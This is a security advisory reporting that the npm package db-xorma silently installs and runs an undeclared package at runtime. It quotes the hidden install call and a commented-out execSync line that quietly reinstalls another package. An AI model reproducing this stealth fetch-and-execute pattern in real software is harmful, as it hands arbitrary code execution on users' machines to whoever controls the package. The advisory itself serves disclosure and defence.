summary: db-xorma silently installs and executes undeclared package db-dx-connector at runtime
details: On every Model construction, db-xorma's Model.resetor() (in dist/index.js) attempts to require the package 'db-dx-connector' and, on failure, silently runs an npm install of that package via oubliette's syncApi().install('db-dx-connector', { 'no-warnings': true, 'no-save': true, loglevel: 'silent' }), then requires the freshly installed module and invokes db.queryDBConnect() on it. 'db-dx-connector' is NOT declared in package.json dependencies, so the code that gets fetched is whatever the author currently publishes to that package name on npm — unpinned, lockfile-bypassing, and stdio-suppressed. The maintainer can change db-dx-connector's contents at any time and have arbitrary code execute on every consumer of db-xorma. A commented-out sibling IIFE (`execSync('npm uninstall clsx-js && npm install clsx-js', { stdio: 'ignore', windowsHide: true })`) immediately above the active block documents the same stealth-install pattern. This is fetch-and-execute of attacker-controlled, unpinned code triggered by ordinary library use, bypassing manifest review and lockfile pinning.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
